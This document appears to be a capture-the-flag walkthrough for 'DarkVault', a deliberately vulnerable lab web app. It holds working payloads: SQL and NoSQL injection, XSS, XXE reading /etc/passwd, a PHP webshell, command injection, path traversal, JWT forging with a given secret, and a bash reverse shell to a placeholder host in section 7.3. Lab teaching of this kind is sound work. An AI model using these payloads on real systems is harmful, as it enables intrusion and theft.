# DarkVault Vulnerability Testing Guide

This guide provides step-by-step instructions for testing all the vulnerabilities in the DarkVault application.

## Setup

1. Clone the repository:
   ```
   git clone https://github.com/yourusername/darkvault.git
   cd darkvault
   ```

2. Install dependencies:
   ```
   npm install
   ```

3. Start the application:
   ```
   npm start
   ```

4. Access the application at `http://localhost:3000`

## Default Login Credentials

| Username | Password | Role | Description |
|----------|----------|------|-------------|
| admin | SecretPassword123! | Administrator | Full access to all features including admin panel |
| user1 | Password123 | Regular User | Limited permissions to basic features |
| manager | ManageIt!2023 | Manager | Enhanced privileges but not full admin access |
| test | test123 | Regular User | Minimum permissions to basic features |

## User Permission Details

### Admin Users
- Full access to all features
- Access to admin panel at `/admin`
- Can use command console at `/command`
- Can add, edit, and delete users
- Access to system logs at `/admin/logs`
- Access to all API endpoints
- Can modify system settings

### Manager Users
- Enhanced privileges but not full admin access
- Can access:
  - Dashboard
  - User listings
  - Product management
  - Message board
- API access to:
  - `/users` endpoints
  - `/products` endpoints
  - `/messages` endpoints
  - `/todos` endpoints
- Cannot access admin panel, logs, or command console
- Cannot modify system settings

### Regular Users
- Basic access to personal dashboard
- Can view/manage own profile
- Can post messages
- Can create and manage personal todos
- Cannot access admin or manager-specific features

## Testing User Permissions

### 1. Admin Permissions Testing
1. Login with admin credentials
2. Verify access to `/admin` panel
3. Try using the command console at `/command`
4. Check ability to add/edit/delete users
5. Verify access to system logs at `/admin/logs`

### 2. Manager Permissions Testing
1. Login with manager credentials
2. Verify access to dashboard, users, products, and message board
3. Verify inability to access `/admin` panel
4. Try accessing API endpoints:
   - `/api/users` (should be accessible)
   - `/api/products` (should be accessible)
   - `/api/admin/logs` (should be blocked)
5. Document which features are accessible and which are blocked

### 3. Regular User Permissions Testing
1. Login with user1 or test credentials
2. Verify access to personal dashboard
3. Try accessing restricted areas:
   - `/admin` (should be blocked)
   - `/command` (should be blocked)
   - User listings (may be accessible due to IDOR vulnerability)
4. Document which features are accessible and which are blocked

### 4. Permission Bypass Testing
1. Login as a regular user (user1 or test)
2. Use JWT token manipulation to elevate privileges:
   - Extract the JWT token
   - Modify `isAdmin` to `true` and `role` to `admin`
   - Try accessing admin features
3. Manipulate URL parameters to bypass manager restrictions:
   - Try adding `?admin=true` to URLs
4. Try direct access to restricted resources by URL manipulation
5. Document any successful permission bypasses

## 1. Enumeration & Reconnaissance

### 1.1. Exposed API Endpoints
1. Browse to `/api`
2. Review HTML source for API documentation comments
3. Document all discovered endpoints

### 1.2. Information Disclosure
1. Submit invalid data to endpoints to trigger errors
2. Observe error messages for technical details
3. Try accessing `/api/config` endpoint

### 1.3. User Enumeration
1. At the login page, try different usernames
2. Compare response messages for valid vs. invalid users
3. Document which usernames exist based on different responses

### 1.4. Technical Details in Headers
1. Use browser developer tools (F12) to inspect network responses
2. Check for sensitive information in HTTP headers
3. Document any server/technology information

### 1.5. Hidden Endpoints
1. View page source code to look for HTML comments
2. Check for `/site-map` endpoint
3. Check for `/docs` directory

## 2. Authentication & Authorization Vulnerabilities

### 2.1. SQL Injection in Login
1. At the login page, enter `' OR 1=1 --` in username field
2. Enter any text in password field
3. Submit the login form
4. You should be logged in as the first user in the database

### 2.2. Weak Password Hashing
1. After completing 2.1, use SQL injection to extract password hashes
2. Use `' UNION SELECT 1,2,id,username,password,email,7 FROM users--` in search field
3. Copy the MD5 hashes
4. Use an online tool like CrackStation to crack the hashes

### 2.3. JWT Vulnerabilities
1. Login as a regular user
2. Intercept the login response with browser dev tools
3. Extract the JWT token
4. Go to [jwt.io](https://jwt.io) to decode the token
5. Modify payload to change `isAdmin` to `true` and `role` to `admin`
6. Re-encode the token using the secret key `darkvault-secret-key`
7. Replace your current token with the modified one (in Local Storage or cookie)
8. Access `/admin` to verify your escalated privileges

### 2.4. Missing Access Controls
1. Login as a regular user
2. Try directly accessing `/admin` in the URL
3. Document whether access is allowed or properly restricted

### 2.5. IDOR Vulnerabilities
1. Login as a regular user
2. Access your profile page (should be something like `/user/2`)
3. Change the ID in the URL to another value (e.g., `/user/1`)
4. Document if you can access another user's data

### 2.6. Weak Password Reset
1. Request a password reset for a user account
2. Analyze the reset token for patterns or predictability
3. Try to predict another user's reset token

### 2.7. Session Fixation
1. Visit `/user/session-fixation?sessionId=known-value`
2. Login with a valid user
3. Check if the application continues to use your predefined session ID

## 3. Input Validation Vulnerabilities

### 3.1. Cross-Site Scripting (XSS)

#### 3.1.1. Stored XSS
1. Navigate to the message board or comment feature
2. Post a message containing: `<script>alert('XSS')</script>`
3. Load the page again to see if the script executes

#### 3.1.2. Reflected XSS
1. Use a URL parameter like `/?search=<script>alert('XSS')</script>`
2. Check if the script executes immediately when the page loads

#### 3.1.3. DOM-based XSS
1. Navigate to `/client-render`
2. Input `<img src=x onerror="alert('DOM XSS')">`
3. Check if the script executes

### 3.2. Command Injection
1. Find the ping tool in the application
2. Enter `localhost; ls -la` as input
3. Check if command output is displayed

### 3.3. SQL Injection in Search
1. Navigate to a search function
2. Enter `' OR 1=1--` in the search field
3. Verify that all database entries are displayed

### 3.4. XML External Entity (XXE) Injection
1. Find a feature that accepts XML uploads or inputs
2. Create an XML file with the following:
   ```xml
   <?xml version="1.0" encoding="ISO-8859-1"?>
   <!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
   <foo>&xxe;</foo>
   ```
3. Upload or submit the file
4. Check if file contents are displayed

### 3.5. Unrestricted File Upload
1. Find a file upload feature
2. Create a simple PHP webshell file (e.g., `shell.php`) with:
   ```php
   <?php system($_GET['cmd']); ?>
   ```
3. Upload the file
4. Try to access the uploaded file with a parameter like `?cmd=ls`

### 3.6. Path Traversal
1. Find features that access files (such as the `/api/file` endpoint)
2. Try these specific path traversal payloads:
   - `../config.secret` (access JWT secret)
   - `../flag.txt` (access root flag)
   - `../etc/darkflag` (access flag in etc dir)
   - `../etc/passwd` (access mock passwd file)
   - `../docs/sensitive.txt` (access sensitive docs)
   - `../app.js` (access application source code)
3. For advanced path traversal that bypasses basic protections, try:
   - `..%2f..%2fflag.txt` (URL encoded)
   - `.././../etc/darkflag` (alternative representation)
   - `....//etc/passwd` (nested traversal)
   - Try different encodings of the ../ sequence
4. Check for successful access to files outside the intended directory

Note: All these test files are created locally when the application starts.

## 4. Information Disclosure Vulnerabilities

### 4.1. Path Disclosure
1. Trigger application errors
2. Look for file paths in stack traces
3. Document any disclosed server paths

### 4.2. Source Code Exposure
1. Try accessing `/docs/../app.js` or similar path traversal
2. Check if application source code is accessible

### 4.3. Configuration Exposure
1. Access `/api/config` endpoint
2. Check for sensitive configuration details

## 5. Advanced Injection Attacks

### 5.1. Advanced SQL Injection
1. In a search field, use:
   ```
   ' UNION SELECT 1,2,username,password,5,6,7 FROM users--
   ```
2. Verify database extraction works

### 5.2. Server-Side Template Injection (SSTI)
1. Find template input fields
2. Enter `<%= process.env %>` 
3. Check if server environment variables are displayed

### 5.3. NoSQL Injection
1. Locate JSON-based endpoints
2. Try submitting JSON with injection like:
   ```json
   {"username": {"$ne": null}, "password": {"$ne": null}}
   ```
3. Check if authentication can be bypassed

## 6. Session Handling Vulnerabilities

### 6.1. Insecure Session Configuration
1. Login to the application
2. Use browser dev tools to examine cookies
3. Check for missing security attributes (HttpOnly, Secure, SameSite)

### 6.2. CSRF Vulnerability Testing
1. Create an HTML file with a form that submits to a state-changing endpoint:
   ```html
   <form action="http://localhost:3000/user/update-profile" method="POST">
     <input type="hidden" name="email" value="hacked@example.com">
     <input type="submit" value="Click me">
   </form>
   ```
2. Open the HTML file in a browser while logged in to DarkVault
3. Click the button and see if the action completes without CSRF validation

## 7. Complete Attack Chains

### 7.1. Privilege Escalation Chain
1. Register a new account
2. Browse to `/site-map` to discover endpoints
3. Login and obtain JWT from network request
4. Use [jwt.io](https://jwt.io) to change `isAdmin` to `true` and `role` to `admin`
5. Use modified token to access `/admin`
6. Look for the flag: `DARK{jwt_4dm1n_3sc4l4t10n}`

### 7.2. Data Exfiltration Chain
1. Access the search functionality
2. Test for SQL injection with `'`
3. Use `' UNION SELECT 1,2,3,4,5,6,7 FROM users--` to determine column count
4. Use `' UNION SELECT 1,2,id,username,password,email,7 FROM users--`
5. Extract and crack the MD5 hashes
6. Look for the flag: `DARK{sql_m4st3r}`

### 7.3. Server Compromise Chain
1. Login to application
2. Locate command injection at `/ping`
3. Enter `localhost; id` to confirm command execution
4. Use `; cat /etc/passwd` to gather system information
5. Use `; cat /opt/flag.txt` to read command injection flag
6. Create reverse shell: `; bash -c 'bash -i >& /dev/tcp/your-ip/your-port 0>&1'`
7. Look for the flag: `DARK{c0mm4nd_1nj3ct10n_pr0}`

## 8. Documentation and Reporting

1. Create a list of all vulnerabilities found
2. Document each vulnerability with:
   - Description
   - Steps to reproduce
   - Impact
   - Proof (screenshots, captured flags, etc.)
3. Collect all flags in the format `DARK{unique_identifier}`
4. Complete the vulnerability checklist from `/docs/vulnerability_checklist.md`

## Note

This guide should be used only in controlled environments for educational purposes. Do not use these techniques against systems without proper authorization. 